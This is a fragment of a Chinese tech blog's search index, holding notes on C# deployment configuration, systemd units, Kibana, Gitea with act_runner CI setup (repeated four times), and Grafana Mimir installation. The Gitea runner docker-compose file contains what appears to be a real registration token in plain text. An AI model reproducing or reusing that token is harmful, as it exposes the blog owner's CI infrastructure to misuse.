","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/:3:3","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/#下载任务-downloadfile"},{"categories":["blog"],"content":" single file 设计文档 design.md ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/:3:4","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/#single-file"},{"categories":["blog"],"content":" 运行配置","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/:4:0","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/#运行配置"},{"categories":["blog"],"content":" gc 配置 # 多gc节省 0-9之间 https://learn.microsoft.com/zh-cn/dotnet/core/runtime-config/garbage-collector#conserve-memory ENV DOTNET_GCConserveMemory=9 # 工作站模式会更加节约内存 ENV DOTNET_gcServer=0 ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/:4:1","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/#gc-配置"},{"categories":["blog"],"content":" 守护进程这里是 Systemd 配置文件示例 /etc/systemd/system/pusher-webapi-staging.service [Unit] Description=pusher Documentation=https://github.com/kentxxq/pusher.webapi/ # 启动区间30s内,尝试启动3次 StartLimitIntervalSec=30 StartLimitBurst=3 [Service] # 环境变量 $MY_ENV1 # Environment=MY_ENV1=value1 # Environment=\"MY_ENV2=value2\" # 环境变量文件,文件内容\"MY_ENV3=value3\" $MY_ENV3 # EnvironmentFile=/path/to/environment/file1 # 这里是负优化!!! # 工作站模式,并且尽量回收内存. # Environment=\"DOTNET_GCConserveMemory=9\" # Environment=\"DOTNET_gcServer=0\" Environment=\"ASPNETCORE_ENVIRONMENT=Staging\" # singlefile需要配置解压路径 https://learn.microsoft.com/en-us/dotnet/core/deploying/single-file/overview?tabs=cli#native-libraries Environment=\"DOTNET_BUNDLE_EXTRACT_BASE_DIR=%h/.net\" WorkingDirectory=/root/myApp/pusher-webapi/staging ExecStart=/root/myApp/pusher-webapi/staging/pusher.webapi # 总是间隔30s重启,配合StartLimitIntervalSec实现无限重启 RestartSec=30s Restart=always # 相关资源都发送term后,后发送kill KillMode=mixed LimitNOFILE=infinity TasksMax=infinity [Install] WantedBy=multi-user.target Alias=pws.service ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/:4:2","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/#守护进程"},{"categories":["blog"],"content":" 杂项","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/:5:0","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/#杂项"},{"categories":["blog"],"content":" .gitignore # User-specific files *.rsuser *.suo *.user *.userosscache *.sln.docstates # User-specific files (MonoDevelop/Xamarin Studio) *.userprefs # Mono auto generated files mono_crash.* # Build results [Dd]ebug/ [Dd]ebugPublic/ [Rr]elease/ [Rr]eleases/ x64/ x86/ [Ww][Ii][Nn]32/ [Aa][Rr][Mm]/ [Aa][Rr][Mm]64/ bld/ [Bb]in/ [Oo]bj/ [Oo]ut/ [Ll]og/ [Ll]ogs/ # Visual Studio 2015/2017 cache/options directory .vs/ # Uncomment if you have tasks that create the project's static files in wwwroot #wwwroot/ # Visual Studio 2017 auto generated files Generated\\ Files/ # MSTest test Results [Tt]est[Rr]esult*/ [Bb]uild[Ll]og.* # NUnit *.VisualState.xml TestResult.xml nunit-*.xml # Build Results of an ATL Project [Dd]ebugPS/ [Rr]eleasePS/ dlldata.c # Benchmark Results BenchmarkDotNet.Artifacts/ # .NET Core project.lock.json project.fragment.lock.json artifacts/ # ASP.NET Scaffolding ScaffoldingReadMe.txt # StyleCop StyleCopReport.xml # Files built by Visual Studio *_i.c *_p.c *_h.h *.ilk *.meta *.obj *.iobj *.pch *.pdb *.ipdb *.pgc *.pgd *.rsp *.sbr *.tlb *.tli *.tlh *.tmp *.tmp_proj *_wpftmp.csproj *.log *.vspscc *.vssscc .builds *.pidb *.svclog *.scc # Chutzpah Test files _Chutzpah* # Visual C++ cache files ipch/ *.aps *.ncb *.opendb *.opensdf *.sdf *.cachefile *.VC.db *.VC.VC.opendb # Visual Studio profiler *.psess *.vsp *.vspx *.sap # Visual Studio Trace Files *.e2e # TFS 2012 Local Workspace $tf/ # Guidance Automation Toolkit *.gpState # ReSharper is a .NET coding add-in _ReSharper*/ *.[Rr]e[Ss]harper *.DotSettings.user # TeamCity is a build add-in _TeamCity* # DotCover is a Code Coverage Tool *.dotCover # AxoCover is a Code Coverage Tool .axoCover/* !.axoCover/settings.json # Coverlet is a free, cross platform Code Coverage Tool coverage*.json coverage*.xml coverage*.info # Visual Studio code coverage results *.coverage *.coveragexml # NCrunch _NCrunch_* .*crunch*.local.xml nCrunchTemp_* # MightyMoose *.mm.* AutoTest.Net/ # Web workbench (sass) .sass-cache/ # Installshield output folder [Ee]xpress/ # DocProject is a documentation generator add-in DocProject/buildhelp/ DocProject/Help/*.HxT DocProject/Help/*.HxC DocProject/Help/*.hhc DocProject/Help/*.hhk DocProject/Help/*.hhp DocProject/Help/Html2 DocProject/Help/html # Click-Once directory publish/ # Publish Web Output *.[Pp]ublish.xml *.azurePubxml # Note: Comment the next line if you want to checkin your web deploy settings, # but database connection strings (with potential passwords) will be unencrypted # *.pubxml *.publishproj # Microsoft Azure Web App publish settings. Comment the next line if you want to # checkin your Azure Web App publish settings, but sensitive information contained # in these scripts will be unencrypted PublishScripts/ # NuGet Packages *.nupkg # NuGet Symbol Packages *.snupkg # The packages folder can be ignored because of Package Restore **/[Pp]ackages/* # except build/, which is used as an MSBuild target. !**/[Pp]ackages/build/ # Uncomment if necessary however generally it will be regenerated when needed #!**/[Pp]ackages/repositories.config # NuGet v3's project.json files produces more ignorable files *.nuget.props *.nuget.targets # Microsoft Azure Build Output csx/ *.build.csdef # Microsoft Azure Emulator ecf/ rcf/ # Windows Store app package directories and files AppPackages/ BundleArtifacts/ Package.StoreAssociation.xml _pkginfo.txt *.appx *.appxbundle *.appxupload # Visual Studio cache files # files ending in .cache can be ignored *.[Cc]ache # but keep track of directories ending in .cache !?*.[Cc]ache/ # Others ClientBin/ ~$* *~ *.dbmdl *.dbproj.schemaview *.jfm *.pfx *.publishsettings orleans.codegen.cs # Including strong name files can present a security risk # (https://github.com/github/gitignore/pull/2483#issue-259490424) #*.snk # Since there are multiple workflows, uncomment next line to ignore bower_components # (https://github.com/github/gitignore/pull/1529#issuecomment-104372622) #bower_components/ # RIA/Silverlight projects Generated_Code/ ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/:5:1","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/#gitignore"},{"categories":["blog"],"content":" .dockerignore **/.classpath **/.dockerignore **/.env **/.git **/.gitignore **/.project **/.settings **/.toolstarget **/.vs **/.vscode **/*.*proj.user **/*.dbmdl **/*.jfm **/azds.yaml **/bin **/charts **/docker-compose* **/Dockerfile* **/node_modules **/npm-debug.log **/obj **/secrets.dev.yaml **/values.dev.yaml LICENSE README.md ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/:5:2","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/#dockerignore"},{"categories":["blog"],"content":" launchSettingslaunchSettings.json 在调试的时候，workingDirectory 配合下载任务使用，避免找不到文件的情况 { \"profiles\": { \"TestServer\": { \"commandName\": \"Project\", \"launchBrowser\": false, \"launchUrl\": \"swagger\", \"workingDirectory\": \"$(OutputPath)\", \"environmentVariables\": { \"ASPNETCORE_ENVIRONMENT\": \"Development\" }, \"dotnetRunMessages\": true, \"applicationUrl\": \"http://localhost:5000\" }, \"Docker\": { \"commandName\": \"Docker\", \"launchBrowser\": true, \"launchUrl\": \"{Scheme}://{ServiceHost}:{ServicePort}/swagger\", \"publishAllPorts\": true } }, \"$schema\": \"https://json.schemastore.org/launchsettings.json\" } ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/:5:3","series":null,"tags":["blog","csharp"],"title":"csharp项目配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE/#launchsettings"},{"categories":["point"],"content":"EFK 是三个开源软件的缩写，Elasticsearch，Fluentd/Filebeat，kibana ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/efk/:0:0","series":null,"tags":["point","EFK"],"title":"EFK","uri":"/posts/%E7%AC%94%E8%AE%B0/point/efk/#"},{"categories":["point"],"content":"github 是微软收购的公司, 做开源平台的. 为大家提供 git 服务. 要点: 用户量最大 基本上都免费使用 ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/github/:0:0","series":null,"tags":["point","github"],"title":"github","uri":"/posts/%E7%AC%94%E8%AE%B0/point/github/#"},{"categories":["point"],"content":"kibana 是一个 ui-web, 通常用来配合展示日志信息 ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/kibana/:0:0","series":null,"tags":["point","kibana"],"title":"kibana","uri":"/posts/%E7%AC%94%E8%AE%B0/point/kibana/#"},{"categories":["point"],"content":" 安装官方安装文档 deb包安装 apt install kibana -y vim /etc/kibana/kibana.yml #修改 server.port: 5601 server.host: \"0.0.0.0\" elasticsearch.hosts: [\"http://EFK:9200\"] i18n.locale: \"zh-CN\" #这是显示中文 systemctl enable kibana --now docker安装 ","date":"2023-07-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/kibana/:1:0","series":null,"tags":["point","kibana"],"title":"kibana","uri":"/posts/%E7%AC%94%E8%AE%B0/point/kibana/#安装"},{"categories":["journal"],"content":"2023-07-24 日记","date":"2023-07-24","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-24/","series":null,"tags":["journal"],"title":"2023-07-24","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-24/"},{"categories":["journal"],"content":"#lines 看了 我入职了 - V2EX 觉得术业有专攻, 前端面试也是很卷, 难度很高的. 技术能力是不错的, 但是环境不好. 文章里的面试题都可以拿过来学习前端了 楼主年纪不大, 但是自律性很不错. 比我 23 岁时候有目标感. ","date":"2023-07-24","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-24/:0:0","series":null,"tags":["journal"],"title":"2023-07-24","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-24/#"},{"categories":["point"],"content":"docker-compose 是 docker 的一个子命令 (原来是独立的, 但是现在合并了). 要点: 方便搭建微服务 阅读 yml 清晰 ","date":"2023-07-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/docker-compose/:0:0","series":null,"tags":["point","docker"],"title":"docker-compose","uri":"/posts/%E7%AC%94%E8%AE%B0/point/docker-compose/#"},{"categories":["point"],"content":"gitea 是一个 go 语言编写的 git 服务器. 要点: 开源, 免费 占用资源小 支持 CICD ","date":"2023-07-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/gitea/:0:0","series":null,"tags":["point","gitea"],"title":"gitea","uri":"/posts/%E7%AC%94%E8%AE%B0/point/gitea/#"},{"categories":["blog"],"content":"[[笔记/point/gitea|gitea]] 支持了 [[笔记/point/CICD|CICD]],且兼容 github 的 actions, 这样就可以复用很多的脚本了.这里记录一下相关的搭建, 配置, 使用.","date":"2023-07-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitea%E6%95%99%E7%A8%8B/","series":null,"tags":["blog","gitea"],"title":"gitea教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitea%E6%95%99%E7%A8%8B/"},{"categories":["blog"],"content":" 简介gitea 支持了 CICD,且兼容 github 的 actions, 这样就可以复用很多的脚本了. 这里记录一下相关的搭建, 配置, 使用. ","date":"2023-07-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitea%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog","gitea"],"title":"gitea教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitea%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 内容","date":"2023-07-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitea%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog","gitea"],"title":"gitea教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitea%E6%95%99%E7%A8%8B/#内容"},{"categories":["blog"],"content":" 基础安装 mkdir -p gitea/{data,config} cd gitea chown 1000:1000 config/ data/ vim docker-compose.yml docker-compose 配置文件 version: \"3\" services: server: image: gitea/gitea:1.20-rootless restart: always volumes: # 数据 - ./data:/var/lib/gitea # 配置 - ./config:/etc/gitea - /etc/timezone:/etc/timezone:ro - /etc/localtime:/etc/localtime:ro ports: # web端口 - \"3000:3000\" # ssh端口 - \"2222:2222\" config/app.ini 的重要配置 [server] # ssh clone的时候域名地址 SSH_DOMAIN = git.kentxxq.com SSH_PORT = 2222 # http clone地址 ROOT_URL = https://git.kentxxq.com/ ","date":"2023-07-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitea%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["blog","gitea"],"title":"gitea教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitea%E6%95%99%E7%A8%8B/#基础安装"},{"categories":["blog"],"content":" CICD 配置gitea config/app.ini 配置 # 开启cicd.actions是从github拉取 [actions] ENABLED=true 放到一个新文件夹 runner 里 mkdir runner cd runner 准备配置文件 config.yaml # 注册信息 docker run --entrypoint=\"\" --rm -it gitea/act_runner:latest act_runner generate-config \u003e config.yaml # 因为需要下载一些包,例如setup-dotnet.但是无法联通,所以建议配置代理 runner: envs: HTTP_PROXY: '' HTTPS_PROXY: '' NO_PROXY: 'localhost,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,*.test.example.com' 配置文件 vim docker-compose.yml version: \"3\" services: runner: image: gitea/act_runner:latest environment: CONFIG_FILE: /config.yaml GITEA_INSTANCE_URL: \"https://git.kentxxq.com/\" GITEA_RUNNER_REGISTRATION_TOKEN: \"8awCQkLBA2BKjXex3bud331Sh5bW5NUbMtyJQSmL\" GITEA_RUNNER_NAME: \"runner1\" # 默认 ubuntu-latest GITEA_RUNNER_LABELS: \"test\" HTTP_PROXY: '' HTTPS_PROXY: '' NO_PROXY: 'localhost,*.baidu.com' volumes: - ./config.yaml:/config.yaml - ./data:/data - /var/run/docker.sock:/var/run/docker.sock 测试代码块根目录/.gitea/workflows/demo.yaml name: Gitea Actions Demo run-name: ${{ gitea.actor }} is testing out Gitea Actions 🚀 on: # 无法手动 # workflow_dispatch: push: jobs: Explore-Gitea-Actions: # 这里和runner的标签匹配,可以多个[a,b] runs-on: ubuntu-latest steps: - run: echo \"🎉 The job was automatically triggered by a ${{ gitea.event_name }} event.\" - run: echo \"🐧 This job is now running on a ${{ runner.os }} server hosted by Gitea!\" - run: echo \"🔎 The name of your branch is ${{ gitea.ref }} and your repository is ${{ gitea.repository }}.\" - name: Check out repository code uses: actions/checkout@v3 - run: echo \"💡 The ${{ gitea.repository }} repository has been cloned to the runner.\" - run: echo \"🖥️ The workflow is now ready to test your code on the runner.\" - name: List files in the repository run: | ls ${{ gitea.workspace }} - run: echo \"🍏 This job's status is ${{ job.status }}.\" 重建 runner 管理后台删除 runner docker compose down, docker compose up -d ","date":"2023-07-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitea%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","gitea"],"title":"gitea教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitea%E6%95%99%E7%A8%8B/#cicd"},{"categories":["blog"],"content":" CICD 配置gitea config/app.ini 配置 # 开启cicd.actions是从github拉取 [actions] ENABLED=true 放到一个新文件夹 runner 里 mkdir runner cd runner 准备配置文件 config.yaml # 注册信息 docker run --entrypoint=\"\" --rm -it gitea/act_runner:latest act_runner generate-config \u003e config.yaml # 因为需要下载一些包,例如setup-dotnet.但是无法联通,所以建议配置代理 runner: envs: HTTP_PROXY: '' HTTPS_PROXY: '' NO_PROXY: 'localhost,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,*.test.example.com' 配置文件 vim docker-compose.yml version: \"3\" services: runner: image: gitea/act_runner:latest environment: CONFIG_FILE: /config.yaml GITEA_INSTANCE_URL: \"https://git.kentxxq.com/\" GITEA_RUNNER_REGISTRATION_TOKEN: \"8awCQkLBA2BKjXex3bud331Sh5bW5NUbMtyJQSmL\" GITEA_RUNNER_NAME: \"runner1\" # 默认 ubuntu-latest GITEA_RUNNER_LABELS: \"test\" HTTP_PROXY: '' HTTPS_PROXY: '' NO_PROXY: 'localhost,*.baidu.com' volumes: - ./config.yaml:/config.yaml - ./data:/data - /var/run/docker.sock:/var/run/docker.sock 测试代码块根目录/.gitea/workflows/demo.yaml name: Gitea Actions Demo run-name: ${{ gitea.actor }} is testing out Gitea Actions 🚀 on: # 无法手动 # workflow_dispatch: push: jobs: Explore-Gitea-Actions: # 这里和runner的标签匹配,可以多个[a,b] runs-on: ubuntu-latest steps: - run: echo \"🎉 The job was automatically triggered by a ${{ gitea.event_name }} event.\" - run: echo \"🐧 This job is now running on a ${{ runner.os }} server hosted by Gitea!\" - run: echo \"🔎 The name of your branch is ${{ gitea.ref }} and your repository is ${{ gitea.repository }}.\" - name: Check out repository code uses: actions/checkout@v3 - run: echo \"💡 The ${{ gitea.repository }} repository has been cloned to the runner.\" - run: echo \"🖥️ The workflow is now ready to test your code on the runner.\" - name: List files in the repository run: | ls ${{ gitea.workspace }} - run: echo \"🍏 This job's status is ${{ job.status }}.\" 重建 runner 管理后台删除 runner docker compose down, docker compose up -d ","date":"2023-07-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitea%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","gitea"],"title":"gitea教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitea%E6%95%99%E7%A8%8B/#配置"},{"categories":["blog"],"content":" CICD 配置gitea config/app.ini 配置 # 开启cicd.actions是从github拉取 [actions] ENABLED=true 放到一个新文件夹 runner 里 mkdir runner cd runner 准备配置文件 config.yaml # 注册信息 docker run --entrypoint=\"\" --rm -it gitea/act_runner:latest act_runner generate-config \u003e config.yaml # 因为需要下载一些包,例如setup-dotnet.但是无法联通,所以建议配置代理 runner: envs: HTTP_PROXY: '' HTTPS_PROXY: '' NO_PROXY: 'localhost,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,*.test.example.com' 配置文件 vim docker-compose.yml version: \"3\" services: runner: image: gitea/act_runner:latest environment: CONFIG_FILE: /config.yaml GITEA_INSTANCE_URL: \"https://git.kentxxq.com/\" GITEA_RUNNER_REGISTRATION_TOKEN: \"8awCQkLBA2BKjXex3bud331Sh5bW5NUbMtyJQSmL\" GITEA_RUNNER_NAME: \"runner1\" # 默认 ubuntu-latest GITEA_RUNNER_LABELS: \"test\" HTTP_PROXY: '' HTTPS_PROXY: '' NO_PROXY: 'localhost,*.baidu.com' volumes: - ./config.yaml:/config.yaml - ./data:/data - /var/run/docker.sock:/var/run/docker.sock 测试代码块根目录/.gitea/workflows/demo.yaml name: Gitea Actions Demo run-name: ${{ gitea.actor }} is testing out Gitea Actions 🚀 on: # 无法手动 # workflow_dispatch: push: jobs: Explore-Gitea-Actions: # 这里和runner的标签匹配,可以多个[a,b] runs-on: ubuntu-latest steps: - run: echo \"🎉 The job was automatically triggered by a ${{ gitea.event_name }} event.\" - run: echo \"🐧 This job is now running on a ${{ runner.os }} server hosted by Gitea!\" - run: echo \"🔎 The name of your branch is ${{ gitea.ref }} and your repository is ${{ gitea.repository }}.\" - name: Check out repository code uses: actions/checkout@v3 - run: echo \"💡 The ${{ gitea.repository }} repository has been cloned to the runner.\" - run: echo \"🖥️ The workflow is now ready to test your code on the runner.\" - name: List files in the repository run: | ls ${{ gitea.workspace }} - run: echo \"🍏 This job's status is ${{ job.status }}.\" 重建 runner 管理后台删除 runner docker compose down, docker compose up -d ","date":"2023-07-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitea%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","gitea"],"title":"gitea教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitea%E6%95%99%E7%A8%8B/#测试"},{"categories":["blog"],"content":" CICD 配置gitea config/app.ini 配置 # 开启cicd.actions是从github拉取 [actions] ENABLED=true 放到一个新文件夹 runner 里 mkdir runner cd runner 准备配置文件 config.yaml # 注册信息 docker run --entrypoint=\"\" --rm -it gitea/act_runner:latest act_runner generate-config \u003e config.yaml # 因为需要下载一些包,例如setup-dotnet.但是无法联通,所以建议配置代理 runner: envs: HTTP_PROXY: '' HTTPS_PROXY: '' NO_PROXY: 'localhost,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,*.test.example.com' 配置文件 vim docker-compose.yml version: \"3\" services: runner: image: gitea/act_runner:latest environment: CONFIG_FILE: /config.yaml GITEA_INSTANCE_URL: \"https://git.kentxxq.com/\" GITEA_RUNNER_REGISTRATION_TOKEN: \"8awCQkLBA2BKjXex3bud331Sh5bW5NUbMtyJQSmL\" GITEA_RUNNER_NAME: \"runner1\" # 默认 ubuntu-latest GITEA_RUNNER_LABELS: \"test\" HTTP_PROXY: '' HTTPS_PROXY: '' NO_PROXY: 'localhost,*.baidu.com' volumes: - ./config.yaml:/config.yaml - ./data:/data - /var/run/docker.sock:/var/run/docker.sock 测试代码块根目录/.gitea/workflows/demo.yaml name: Gitea Actions Demo run-name: ${{ gitea.actor }} is testing out Gitea Actions 🚀 on: # 无法手动 # workflow_dispatch: push: jobs: Explore-Gitea-Actions: # 这里和runner的标签匹配,可以多个[a,b] runs-on: ubuntu-latest steps: - run: echo \"🎉 The job was automatically triggered by a ${{ gitea.event_name }} event.\" - run: echo \"🐧 This job is now running on a ${{ runner.os }} server hosted by Gitea!\" - run: echo \"🔎 The name of your branch is ${{ gitea.ref }} and your repository is ${{ gitea.repository }}.\" - name: Check out repository code uses: actions/checkout@v3 - run: echo \"💡 The ${{ gitea.repository }} repository has been cloned to the runner.\" - run: echo \"🖥️ The workflow is now ready to test your code on the runner.\" - name: List files in the repository run: | ls ${{ gitea.workspace }} - run: echo \"🍏 This job's status is ${{ job.status }}.\" 重建 runner 管理后台删除 runner docker compose down, docker compose up -d ","date":"2023-07-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitea%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","gitea"],"title":"gitea教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitea%E6%95%99%E7%A8%8B/#重建-runner"},{"categories":["blog"],"content":" 维护命令修改 admin 的密码 gitea admin user change-password --username myname --password asecurepassword ","date":"2023-07-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitea%E6%95%99%E7%A8%8B/:3:0","series":null,"tags":["blog","gitea"],"title":"gitea教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitea%E6%95%99%E7%A8%8B/#维护命令"},{"categories":["journal"],"content":"2023-07-23 日记","date":"2023-07-23","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-23/","series":null,"tags":["journal"],"title":"2023-07-23","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-23/"},{"categories":["journal"],"content":" 港澳通行证？签注？傻傻分不清楚，十个问题帮你一次弄清 #fun/旅游助手 ","date":"2023-07-23","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-23/:0:0","series":null,"tags":["journal"],"title":"2023-07-23","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-23/#"},{"categories":["point"],"content":"cicd 是持续集成 (Continuous Integration)-CI 和持续交付 (Continuous Delivery)-CD 的缩写. 属于 devops 的一部分. ","date":"2023-07-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/cicd/:0:0","series":null,"tags":["point","CICD"],"title":"CICD","uri":"/posts/%E7%AC%94%E8%AE%B0/point/cicd/#"},{"categories":["blog"],"content":" 简介grafna-mimir 是 grafana 公司的存储产品, 是 prometheus 的远程存储后端. ","date":"2023-07-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-mimir%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog","mimir","grafana"],"title":"grafana-mimir教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-mimir%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 内容","date":"2023-07-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-mimir%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog","mimir","grafana"],"title":"grafana-mimir教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-mimir%E6%95%99%E7%A8%8B/#内容"},{"categories":["blog"],"content":" 单机安装文档地址 Get started with Grafana Mimir | Grafana Mimir documentation 下载对应版本 curl -Lo mimir https://github.com/grafana/mimir/releases/latest/download/mimir-linux-amd64 chmod +x mimir 配置文件 vim mimir.yml # 禁用多租户 multitenancy_enabled: false # 端口 server: http_listen_port: 9009 grpc_listen_port: 9010 log_level: error blocks_storage: backend: filesystem bucket_store: sync_dir: /tmp/mimir/tsdb-sync filesystem: dir: /tmp/mimir/data/tsdb tsdb: dir: /tmp/mimir/tsdb # 压缩,加速查询 compactor: data_dir: /tmp/mimir/compactor sharding_ring: kvstore: store: memberlist # 接收数据,验证准确性,无状态 distributor: ring: instance_addr: 127.0.0.1 kvstore: store: memberlist # 写入数据的组件,有状态 ingester: ring: instance_addr: 127.0.0.1 kvstore: store: memberlist replication_factor: 1 # 告警规则的存储位置 ruler_storage: backend: filesystem filesystem: dir: /tmp/mimir/rules # 分片 store_gateway: sharding_ring: replication_factor: 1 ","date":"2023-07-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-mimir%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["blog","mimir","grafana"],"title":"grafana-mimir教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-mimir%E6%95%99%E7%A8%8B/#单机安装"},{"categories":["blog"],"content":" minio 存储参考 官方存储文档 写一个配置文件 mimir.yaml 保存到 minio, common: storage: backend: s3 s3: endpoint: s3.us-east-2.amazonaws.com region: us-east-2 access_key_id: \"${AWS_ACCESS_KEY_ID}\" # This is a secret injected via an environment variable secret_access_key: \"${AWS_SECRET_ACCESS_KEY}\" # This is a secret injected via an environment variable blocks_storage: s3: bucket_name: mimir-blocks alertmanager_storage: s3: bucket_name: mimir-alertmanager ruler_storage: s3: bucket_name: mimir-ruler 运行 ./mimir --config.file=mimir-demo.yml ","date":"2023-07-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-mimir%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","mimir","grafana"],"title":"grafana-mimir教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-mimir%E6%95%99%E7%A8%8B/#minio-存储"},{"categories":["blog"],"content":" 守护进程Systemd 守护进程配置 /etc/systemd/system/mimir.service [Unit] Description=mimir # 启动区间30s内,尝试启动3次 StartLimitIntervalSec=30 StartLimitBurst=3 [Service] # 环境变量 $MY_ENV1 # Environment=MY_ENV1=value1 # Environment=\"MY_ENV2=value2\" # 环境变量文件,文件内容\"MY_ENV3=value3\" $MY_ENV3 # EnvironmentFile=/path/to/environment/file1 #WorkingDirectory=/root/myApp/TestServer ExecStart=/root/mimir -config.file=/root/mimir.yaml # 总是间隔30s重启,配合StartLimitIntervalSec实现无限重启 RestartSec=30s Restart=always # 相关资源都发送term后,后发送kill KillMode=mixed # 最大文件打开数不限制 LimitNOFILE=infinity # 子线程数量不限制 TasksMax=infinity [Install] WantedBy=multi-user.target #Alias=testserver.service 